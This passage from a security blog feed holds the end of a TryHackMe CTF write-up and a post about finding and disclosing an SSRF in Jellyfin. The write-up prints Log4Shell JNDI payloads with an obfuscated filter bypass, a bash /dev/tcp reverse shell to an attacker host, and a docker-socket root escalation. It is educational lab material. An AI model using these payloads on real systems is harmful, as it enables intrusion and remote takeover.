&lt;p&gt;On the target machine we start a client that forwards port 172.18.0.1:8888 to the chisel server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./chisel client ATTACKER_IP_ADDRESS:9999 R:8888:172.18.0.1:8888&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On our server we can confirm this is working:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Chisel server receives the port forward." src="/images/shaker/chisel-listening.png"&gt;&lt;/p&gt;
&lt;p&gt;Let's see what our browser tells us.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Whitelabel Error Page." src="/images/shaker/whitelabel-error.png"&gt;&lt;/p&gt;
&lt;p&gt;If we look up this error we can quickly find out that this is Spring Boot.&lt;/p&gt;
&lt;p&gt;First google result:&lt;/p&gt;
&lt;p&gt;&lt;img alt="White Label Error Page is a Spring Boot error page." src="/images/shaker/whitelabel-google.png"&gt;&lt;/p&gt;
&lt;p&gt;Ok, so we know we're dealing with Spring Boot and tomcat. So we're still in the realm of Java applications. Are we still dealing with Log4j?&lt;/p&gt;
&lt;p&gt;It's a possibility, but first we need to figure out why our request is bad. Let's try the HTTP Options method.&lt;/p&gt;
&lt;p&gt;&lt;img alt="HTTP Options Request and Response." src="/images/shaker/http-options.png"&gt;&lt;/p&gt;
&lt;p&gt;This tells us we need to use an X-Api-Version header, so let's try using it.&lt;/p&gt;
&lt;p&gt;&lt;img alt="With the X-Api-Version header." src="/images/shaker/x-api-header.png"&gt;&lt;/p&gt;
&lt;p&gt;Ok, we have a valid request. It stands to reason that X-API-Versions would be logged per request, so we can start by injecting our Log4J payload there. And see if marshalsec gets any requests.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${jndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We unfortunately do not get a call back on marshalsec. And the response:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Error 418" src="/images/shaker/teapot.png"&gt;&lt;/p&gt;
&lt;p&gt;Very interesting, I'm pretty sure I didn't request it to make coffee but it's giving me the famous teapot error code. It's probably the developer implementing another filter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${${::-j}ndi:${::-l}dap://ATTACKER_IP_ADDRESS:1389/Exploit}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This seems to work. We get a callback on marshalsec:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Callback to Marshalsec." src="/images/shaker/call-marshalsec2.png"&gt;&lt;/p&gt;
&lt;p&gt;But curiously this results in no request on our HTTP server. This means LDAP probably wont cut it. Maybe it's a different JVM version or the software doesn't trust the LDAP reply.&lt;/p&gt;
&lt;p&gt;Some further research into Spring boot and JNDI led us to: &lt;a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java"&gt;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&lt;/a&gt;
This, interestingly talks about another, earlier, exploit. It is demonstrated using RMI, which is interesting. So perhaps, it's still possible to exploit this older vulnerability using Log4shell style lookups, via a malicious RMI server.&lt;/p&gt;
&lt;p&gt;Ok, so at this point we can close marshalsec and look for alternatives. We could use veracode's PoC above, but I found this pearl which faciliates the exploit quite a bit:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/pimps/JNDI-Exploit-Kit"&gt;https://github.com/pimps/JNDI-Exploit-Kit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This also incorporates a number of other things, including integration of YSOSerial payloads which can be very useful in other deserialization challenges.&lt;/p&gt;
&lt;p&gt;Let's take a look at our options here:&lt;/p&gt;
&lt;p&gt;&lt;img alt="JNDI-Exploit-Kit Help." src="/images/shaker/JNDI-Kit-help.png"&gt;&lt;/p&gt;
&lt;p&gt;Ok, so let's try creating an RMI server that will try to execute a bash command that will give us a reverse shell on port 4455:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C &lt;span class="s1"&gt;&amp;#39;bash -i &amp;amp;&amp;gt;/dev/tcp/ATTACKER_IP_ADDRESS/4455 &amp;lt;&amp;amp;1&amp;#39;&lt;/span&gt; -R ATTACKER_IP_ADDRESS:1389 -O RMI
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here, our reverse shell is provided by a simpler bash reverse shell payload. This is because we're attacking the Host system, so I expected the extent of system hardening to be much lower so we should be able to just execute bash.
This JNDI exploit kit creates a nice list of URLs serving the payloads we can use:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Payload List." src="/images/shaker/JNDI-Kit.png"&gt;&lt;/p&gt;
&lt;p&gt;We pick the exploit whose trustURLCodebase is false but have Tomcat 8+ or SpringBoot, which likely bypasses the filter that did not allow marshalsec's referal to work.&lt;/p&gt;
&lt;p&gt;We simply have to call the provided URL from our log4j payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${${::-j}ndi:${::-r}mi://ATTACKER_IP_ADDRESS:1389/ozbud1}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And catch a shell on our listener (I used pwncat in this example, which automatically stabilizes our shell):&lt;/p&gt;
&lt;p&gt;&lt;img alt="Reverse Shell on the Host." src="/images/shaker/pwncat.png"&gt;&lt;/p&gt;
&lt;p&gt;And we are now be able to obtain bob's host flag.&lt;/p&gt;
&lt;p&gt;We use pwncat to upload linpeas, make it executable and run it and take a look at the output.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bob is a member the docker group." src="/images/shaker/docker-group.png"&gt;&lt;/p&gt;
&lt;p&gt;Bob seems to be a member of the docker group, and docker socket is writable:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Writable Docker Socket." src="/images/shaker/docker-socket.png"&gt;&lt;/p&gt;
&lt;p&gt;That's all we need to know we obtain root privileges on this machine.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Docker Containers and Images." src="/images/shaker/containers-images.png"&gt;&lt;/p&gt;
&lt;p&gt;We can see the shaker container and its image in the docker repository.&lt;/p&gt;
&lt;p&gt;But we also know this image is severely limited. So instead we'll make our own.&lt;/p&gt;
&lt;p&gt;On our machine we pull alpine:latest:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker pull alpine:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we can use the save option to save an image to tar file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker image save alpine -o alpine.tar 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we upload this to the target machine and load it with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker image load -i alpine.tar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Finally we escalate to root by using this alpine image to spawn a container that mounts the host filesystem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -v /:/host/ alpine:latest chroot /host/ bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="Obtained root privileges." src="/images/shaker/root.png"&gt;&lt;/p&gt;
&lt;p&gt;All that there's left to do is obtain the root flag.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">OmegaVoid</dc:creator><pubDate>Wed, 26 Jan 2022 12:00:00 +0000</pubDate><guid isPermaLink="false">tag:None,2022-01-26:/tryhackme-shaker.html</guid><category>Writeups</category><category>writeup</category><category>Log4j</category><category>Log4Shell</category><category>Docker</category><category>Containers</category></item><item><title>Down the Jellyfish Hole</title><link>/down-the-jellyfish-hole.html</link><description>&lt;blockquote&gt;
&lt;p&gt;Note: This post is not a write up of Year of the Jellyfish, but it does contain spoilers. Continue reading at your own risk.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Year of the Jellyfish&lt;/h2&gt;
&lt;p&gt;This story starts on the release of &lt;a href="https://tryhackme.com/room/yearofthejellyfish"&gt;Year of the Jellyfish&lt;/a&gt;, a room by Muirland Oracle (or Muir) that you can do at &lt;a href="https://tryhackme.com"&gt;TryHackMe.com&lt;/a&gt;. When this room released it started with a pretty interesting challenge. Anyone who rooted the room before 6PM UTC on the 30th of April 2021 would be entered into a prize draw, the big prize would be an OSCP voucher donated by one of the Community Mentors, Fawaz (also known as Papaashell).&lt;/p&gt;
&lt;p&gt;I decided I would go deep into this machine and try hard, not because of the prize (I ended up signing up for OSCP anyways afterwards), but more because Muirland promised a realistic machine, and an OSCP-like (in terms of dificulty and ammount of possible rabbit holes in the machine). Additionally, the atmosphere created in the TryHackMe discord became quite positive and fun, so I ended up spending quite a lot of time with this machine. Plus I enjoy Muirland's rooms quite a bit they tend to push me to try harder.&lt;/p&gt;
&lt;p&gt;This machine had a few peculiarities, including having a public IP, which meant that I ended up opting to deploy a VPS for the inital enumeration. The machine was somewhat realistically put together with a few Vhosts and several services running on the machine. It was made to look like something someone would host on their basement, with a small business website, a server monitor and a Media server. The only thing that really seemed strange to me in that regard, was seeing an ssh honeypot on the machine.&lt;/p&gt;
&lt;p&gt;Without going into too much detail, here's more or less what it looked like.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Domanin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Vhosts&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;robyns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;petshop&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;thm&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;monitorr&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;robyns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;petshop&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;thm&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;robyns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;petshop&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;thm&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;robyns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;petshop&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;thm&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="mf"&gt;2.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;22&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;Open&lt;/span&gt;&lt;span class="n"&gt;SSH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.9&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Debian&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5&lt;/span&gt;&lt;span class="n"&gt;ubuntu1&lt;/span&gt;&lt;span class="mf"&gt;.4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;80&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.4.29&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Robyn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Petshop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;redirects&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;443&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;443&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.4.29&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Robyn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Petshop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Under&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Development&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Kestrel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jellyfin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;22222&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;Open&lt;/span&gt;&lt;span class="n"&gt;SSH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;7.6&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4&lt;/span&gt;&lt;span class="n"&gt;ubuntu0&lt;/span&gt;&lt;span class="mf"&gt;.3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Before I went deep into the services hosted on the ports I decided to have a quick look at the vhosts. Beta and dev seemed to be replicating some of the other ports (and I couldn't find any exploitable differences). Monitorr seemed interesting, it was a service monitor solution, it had a login, and the version on the machine had a known &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28871"&gt;upload vulnerability that could lead to RCE&lt;/a&gt;. However, testing it out initially I was unable to exploit it, as it seemed Muir had patched it - it would not allow an upload even if we gave the endpoint what seemed valid upload content.&lt;/p&gt;
&lt;p&gt;Turns out, that was the route to finish the box, but Muir had patched only enough so that we would have to exploit both the upload functionality and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28872"&gt;CVE-2020-28872&lt;/a&gt;. However, having thought that the upload was patched threw me off the mark, specially when you combined it with what Muir said when asked about room creation inspiration on a live event later that evening:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For me it would usually be coming up with something technical that I like or a technique that I'd want to showcase and then thinking "you know what, this fits in quite nicely with the theme" ... and again, here's a hint...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And this led me down a deep dark path of the Jellyfin rabbit hole. Jellyfin is a free software Media System, where people can collect, manage and stream their media. And the name kind of reminded me of Jellyfish. After hearing this I was fully convinced that Jellyfin must have been the way to obtain a foothold, so I was going to go at it hard. And so I entered the rabbit hole.&lt;/p&gt;
&lt;h2&gt;Jellyfin&lt;/h2&gt;
&lt;p&gt;I went to page 8096, and was greeted by a login page. &lt;/p&gt;
&lt;p&gt;&lt;img alt="Jellyfin Login Page" src="/images/jellyfish/jellyfin-login.png"&gt;&lt;/p&gt;
&lt;p&gt;Except I didn't have a user or a password. Trying to recover the password, I get a message that I have to be "at home" to be able to do password recovery. Ok. So that's something, Lucky for me, I was able to leak the IP from the internal THM network via one of the requests that the browser makes when accessing Jellyfin. So connected to that internal IP via the THM OpenVPN, rather than going through the public IP. This gave me the ability to attack a bit faster and be a bit less worried about what my traffic was looking like to my ISP.&lt;/p&gt;
&lt;p&gt;Once connected via the THM VPN I tried to recover the password for the user 'robyn' (since it's featured in the URL domain). I get the following message.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jellyfin Password Recovery PIN message" src="/images/jellyfish/pin.png"&gt;&lt;/p&gt;
&lt;p&gt;And a lightbulb turns on in my head. Maybe I can find a way to to leak that pin, use that to get access to upload a file and somehow get a reverse shell that way.
I searched around a bit and found: &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21402"&gt;CVE-2021-21402&lt;/a&gt; which made me think, that's exactly the kind of thing I need to open the file that has the pin. Except one problem, this affects Jellyfin before version 10.7.1, and we had version 10.7.2. Once again, Muiri likes to patch vulnerabilities. Plus, by all signs on your port scan, this was a Linux host.&lt;/p&gt;
&lt;p&gt;The running joke at this time on the discord was to offer only "ENUMERATE" to anyone who asked for a hint. So I decided to take that a bit literally and start using a bit of bug hunting methodology and start enumerating all of the Jellyfin API.&lt;/p&gt;
&lt;p&gt;I did some fuzzing, finding a few endpoints, but I was also abit smarter than that and looked up the github for Jellyfin, finding the &lt;a href="https://github.com/jellyfin/jellyfin/blob/91d6ffd731e163bf281348872c2421598fa4edb2/Jellyfin.Server/Properties/launchSettings.json"&gt;launch settings config file&lt;/a&gt;. This file has some interesting information for us to look at:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s2"&gt;&amp;quot;Jellyfin.Server (API Docs)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;commandName&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Project&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;launchBrowser&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;launchUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;api-docs/swagger&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;applicationUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://localhost:8096&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;environmentVariables&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;ASPNETCORE_ENVIRONMENT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Development&amp;quot;&lt;/span&gt;
      &lt;span class="p"&gt;},&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;commandLineArgs&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--nowebclient&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This was a big one for me, it immediately reminded me of Ben Sadeghipour (a.k.a. NahamSec) who loves to hunt down Swagger UI because it allows you to interact with APIs right there on the documentation (see &lt;a href="https://twitter.com/NahamSec/status/1177672652011343873"&gt;this tweet&lt;/a&gt; about it, or &lt;a href="https://twitter.com/NahamSec/status/1280246454884331520"&gt;this one&lt;/a&gt;). This piece of knowledge had stuck with me from watching some of Ben's streams and presentations. He is an aswesome person and you should check him out too if you have a chance. &lt;/p&gt;
&lt;p&gt;So I go to http://robyns-petshop.thm:8096/api-docs/swagger and get very detailed documentation for the Jellyfin API, it is indeed Swagger UI after all.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jellyfin Swagger UI" src="/images/jellyfish/jelly-swagger.png"&gt;&lt;/p&gt;
&lt;p&gt;It felt like a little victory. I had a lot of visibility over everythign that Jellyfin could do, and could easily interact with it all. At this point I was convinced that there was some endpoint that would give me access to the Pin file.&lt;/p&gt;
&lt;p&gt;I went through the API, looking for possible vulnerabilities. At this point I had also come to realize that Jellyfin was a fork from previously open source probject named Emby, when it decided to go proprietary. Emby had a previous vulnerability disclosed - &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26948"&gt;CVE-2020-26948&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Emby Server before 4.5.0 allows SSRF via the Items/RemoteSearch/Image ImageURL parameter.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And this was interesting, that endpoint existed on Jellyfin's API, I poked that that particular endpoint and kept getting Unathorized responses. But strangely, there was another endpoint that did a very similar thing:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/Images/Remote?ImageUrl=&amp;lt;URL&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And this was immediately strange to me. Why would someone replicate an endpoint that did the same thing but with a different name. This also seemed to break the naming convention that was happening throughout the rest of the API.&lt;/p&gt;
&lt;p&gt;Additionally, looking at the API, it seemd that endpoint didn't have HTTP code 401 - Unauthorized as a possible response to that request. It was either 200 or 404. This was interesting. So to do a first test, I tried to access the /web/touchicon.png (the jellyfin logo) on the ImageURL, but requesting it from localhost:8096 instead.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://&amp;lt;IP_ADDRESS&amp;gt;:8096/Images/Remote?imageUrl=http://localhost:8096/web/touchicon.png&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And it delivered the file to me. Ok. I was onto something. I had SSRF, I could make calls as if I was inside the machine. Maybe Muiri had planted a vulnerable endpoint for us to exploit. &lt;/p&gt;
&lt;p&gt;Alas, I wasn't able to extract the PIN file through it, but I had found something interesting. After having used the vulnerability to poke at the server, scanning for internal http servers, but after quite some time with it I didn't find anything that could help me solve the box.&lt;/p&gt;
&lt;p&gt;I let Muri know. He finally let me know that wasn't intended. What seemed like something crafted to be vulnerable, wasn't. So, I went on to Jellyfin's github, and dug deeper to find the code for that endpoint. It would call the provided URL without almost any checks (other than checking if it was already in cache). I had found an unknown vulnerability on the Software.&lt;/p&gt;
&lt;p&gt;More or less at the same time, Hydragyrum on Discord was poking at the same API, and after seeing him talk about SSRF on Jellyfin I knew he had found the same thing I did. We got in touch and decided we would work on responsible vulnerability disclosure together for this once we finished the room.&lt;/p&gt;
&lt;p&gt;Eventually both me and Hydra finished the room, after realizing Jellyfin wasn't the way forward, it was only a matter of time until we got a back to Monitorr and found the normal foothold, and from there the root was only a matter of propper Enumeration.&lt;/p&gt;
&lt;h2&gt;Proof of Concept and Responsible Disclosure&lt;/h2&gt;
&lt;p&gt;Hydragyrum is another Community Mentor at THM, and someone who has some experience with dockers, which will become relevant in a bit. I spent a day talking to him about the implications of our finding. While doing this we realized the problem of unauthenticated requests on this endpoint wasn't fully new to the organization:&lt;/p&gt;
&lt;p&gt;An &lt;a href="https://github.com/jellyfin/jellyfin/issues/5415"&gt;issue on the jellyfin repository&lt;/a&gt; had originally mentioned it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;All (raw) image endpoints in ImageByNameController, ImageController &amp;amp; RemoteImageController are unauthenticated&lt;br&gt;
    This allows probing on whether a specific image exists on the server by guessing item id's (which can maybe done without too much trouble, as I believe item id's are just some MD5 hash? To be confirmed) and then checking on what content (movies, series etc) exist on a given server, without having an account.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, this failed to recognize the majority of security implications of endpoint's behavior. It went a lot further than leaking images based on IDs. They were clearly aware they had problems with the endpoint, however we felt it necessary to inform Jellyfin more accurately of the implications of this problem.&lt;/p&gt;
&lt;p&gt;The next day Hydra assembled a quick docker compose with Jellyfin and an internal Nginx server as well. With that in place, he also created a quick proof of concept, demonstrating not only that we could reach internal resources - in this case the Nginx server - but also do port scanning of the internal network. We only had GET HTTP(S) access without cookies but it was enough to do a lot of internal network recon, and to leak internal resources.&lt;/p&gt;
&lt;p&gt;I wrote an email to Jellyfin explaining everything it could do and packaged our docker-compose, an HTTP request demonstrating access to internal resources, and a short python script that could perform port and IP scanning. It wasn't pretty, but it worked, and demonstrated the problem really well.&lt;/p&gt;
